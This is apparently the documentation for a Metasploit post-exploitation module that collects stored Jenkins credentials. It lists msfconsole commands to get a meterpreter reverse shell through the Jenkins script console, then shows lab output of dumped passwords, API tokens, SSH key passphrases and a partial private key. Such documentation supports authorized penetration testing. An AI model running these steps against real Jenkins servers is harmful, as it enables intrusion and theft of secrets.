## Vulnerable Application

  Official Source:
[Jenkins](https://jenkins.io/download/)

This module has been verified against:

  1. Jenkins 2.67 on Ubuntu 16.04 in Docker
  1. Jenkins 2.67 on Windows 7 SP 1
  1. Jenkins 2.60.1
  1. Jenkins 1.56

## Verification Steps

  1. Set up Jenkins to obtain a shell (use Docker for quick setup)
  1. Run `docker run -p 8080:8080 -p 50000:50000 jenkins`
  1. Use the default setup and install "suggested plugins"
  1. Create new user admin, add a user or credential (via Manage Jenkins)
  1. Start msfconsole
  1. We'll use the `jenkins_script_console` module to quickly gain a shell
  1. Do: ```use exploit/multi/http/jenkins_script_console```
  1. Do: ```set RHOST 172.17.0.1```
  1. Do: ```set RPORT 8080```
  1. Do: ```set TARGETURI /```
  1. Do: ```set USERNAME admin```
  1. Do: ```set PASSWORD or set API_TOKEN```
  1. Do: ```set TARGET 1```
  1. Do: ```set PAYLOAD linux/x86/meterpreter/reverse_tcp```
  1. Do: ```set LHOST 192.168.56.105```
  1. Do: ```exploit -j```
  1. Do: ```use post/multi/gather/jenkins_gather```
  1. Do: ```set SESSION 1```
  1. Do: ```run```
  1. You should see the saved credentials output

## Options

  **SEARCH_JOBS**

  This option searches through the `jobs` folder for interesting
keywords but obviously increases runtime on larger instances.

  **STORE_LOOT**

  This option saves interesting files and loot to disk. If set to
false will simply output data to console.

## Scenarios

**Jenkins on Windows**

```
msf post(jenkins_gather) > sessions

Active sessions
===============

  Id  Type                     Information                   Connection
  --  ----                     -----------                   ----------
  18  shell x86/linux                                        192.168.56.105:4444 -> 192.168.56.1:58828 (172.17.0.1)
  20  meterpreter x86/linux    uid=0, gid=0, euid=0, egid=0  192.168.56.105:4444 -> 192.168.56.1:58974 (172.17.0.2)
  21  meterpreter x86/windows  NT AUTHORITY\SYSTEM @ kali    192.168.56.105:4444 -> 192.168.56.101:50427 (192.168.56.101)
  23  shell x86/windows                                      192.168.56.105:4444 -> 192.168.56.101:50793 (192.168.56.101)

msf post(jenkins_gather) > info

       Name: Jenkins Credential Collector
     Module: post/multi/gather/jenkins_gather
   Platform: Linux, Windows
       Arch: 
       Rank: Normal

Provided by:
  thesubtlety

Basic options:
  Name        Current Setting  Required  Description
  ----        ---------------  --------  -----------
  SEARCH_JOBS true             no        Search through job history logs for interesting keywords. Increases runtime.
  SESSION     17               yes       The session to run this module on.
  STORE_LOOT  true             no        Store files in loot (will simply output file to console if set to false).

Description:
  This module can be used to extract saved Jenkins credentials, user 
  tokens, SSH keys, and secrets. Interesting files will be stored in 
  loot along with combined csv output.


msf post(jenkins_gather) > run

[*] Searching for Jenkins directory... This could take some time...
[*] Found Jenkins installation at C:\Program Files\Jenkins
[+] Credentials found - Username: user1 Password: Password123456
[+] SSH Key found! ID: 83c6a18f-6b35-420a-8534-cc505c3347b5 Passphrase: secretpassphrase123 Username: sshkey1 Description: interesting description
[+] Job Info found  - Job Name:  User: testpass Password: secretpass123
[+] Job Info found  - Job Name:  User: testpass Password: ohwowosupersecret
[+] Node Info found - Name: test Host: hostnode1.lab.local Port: 22 CredID: 972fc428-dd7c-46ea-a119-be78ae0866ad
[+] API Token found - Username: admin Token: 8a114e0fa48c1a489c39b98e94c986c8
[+] API Token found - Username: useruseruser Token: 6810c3f6ccca939ac2a8b8ac4b9de012
[*] Searching through job history for interesting bits...
[+] Job Log truffles:
C:\Program Files\Jenkins\jobs\asdf\builds\4\log:C:\Program Files\Jenkins\workspace\asdf>echo "secret is secret" 
C:\Program Files\Jenkins\jobs\asdf\builds\4\log:"secret is secret"
...
C:\Program Files\Jenkins\jobs\asdf\lastSuccessful\log:C:\Program Files\Jenkins\workspace\asdf>echo "secret is secret" 
C:\Program Files\Jenkins\jobs\asdf\lastSuccessful\log:"secret is secret"
[+] 
Creds
=====

 Username  Password           Description
 --------  --------           -----------
                                          
 testpass  secretpass123                   
 testpass  ohwowosupersecret  
 user1     Password123456     

[+] 
API Keys
========

 Username      API Tokens
 --------      ----------
 admin         8a114e0fa48c1a489c39b98e94c986c8
 useruseruser  6810c3f6ccca939ac2a8b8ac4b9de012

[+] 
Nodes
=====

 Node Name  Hostname             Port  Description   Cred Id
 ---------  --------             ----  -----------   -------
 test       hostnode1.lab.local  22    testtesttest  972fc428-dd7c-46ea-a119-be78ae0866ad

[+] SSH Key
[*]  ID: 83c6a18f-6b35-420a-8534-cc505c3347b5
[*]  Description: interesting description
[*]  Passphrase:  secretpassphrase123
[*]  Username:    sshkey1
[*] 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAuTfL0ijR0JDLTQC092ZolnkTJGRi7YQInK/K1ZFDFc44JOSU
...snip...
7Ad+Ja6+51ECnXJIFKPj7binB6/C10YVqHh4KON3DeA6ZA7ZpUko
-----END RSA PRIVATE KEY-----

[*] Post module execution completed


```

**Jenkins 2.67 on Ubuntu 16.04**

```
msf post(jenkins_gather) > set session 20
session => 18
msf post(jenkins_gather) > info

       Name: Jenkins Credential Collector
     Module: post/multi/gather/jenkins_gather
   Platform: Linux, Windows
       Arch:
       Rank: Normal

Provided by:
  thesubtlety

Basic options:
  Name        Current Setting  Required  Description
  ----        ---------------  --------  -----------
  SEARCH_JOBS true             no        Search through job history logs for interesting keywords. Increases runtime.
  SESSION     17               yes       The session to run this module on.
  STORE_LOOT  true             no        Store files in loot (will simply output file to console if set to false).

Description:
  This module can be used to extract saved Jenkins credentials, user
  tokens, SSH keys, and secrets. Interesting files will be stored in
  loot along with combined csv output.

msf post(jenkins_gather) > run

[*] Searching for Jenkins directory... This could take some time...
[*] Found Jenkins installation at /root/.jenkins
[+] Credentials found - Username: thanksforthefish Password: whatagreatbook
[+] API Token found - Username: user1 Token: 859e1d6ee6ab85804434fa5395ab962d
[+] API Token found - Username: admin Token: 9da706c125a4b5a4c19b1f799723175c
[*] Searching through job history for interesting bits...
[+] 
Creds
=====

 Username          Password         Description
 --------          --------         -----------
 thanksforthefish  whatagreatbook

[+] 
API Keys
========

 Username  API Tokens
 --------  ----------
 admin     9da706c125a4b5a4c19b1f799723175c
 user1     859e1d6ee6ab85804434fa5395ab962d

[*] Post module execution completed
```
